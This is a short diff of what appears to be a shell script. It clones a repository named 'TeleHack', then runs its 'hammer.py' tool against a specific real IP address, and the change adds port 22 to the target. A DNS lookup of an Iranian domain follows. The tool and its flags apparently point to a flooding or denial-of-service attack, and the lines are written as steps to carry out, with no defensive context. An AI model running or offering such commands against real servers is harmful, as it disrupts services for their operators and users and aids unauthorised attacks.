@@ -6,7 +6,7 @@ cd ~
 git clone https://github.com/KingArmin/TeleHack
 cd TeleHack
 
-python3 hammer.py -s 91.134.156.2
+python3 hammer.py -s 91.134.156.2 -p 22
 
 nslookup parsapp.vcp.ir
 
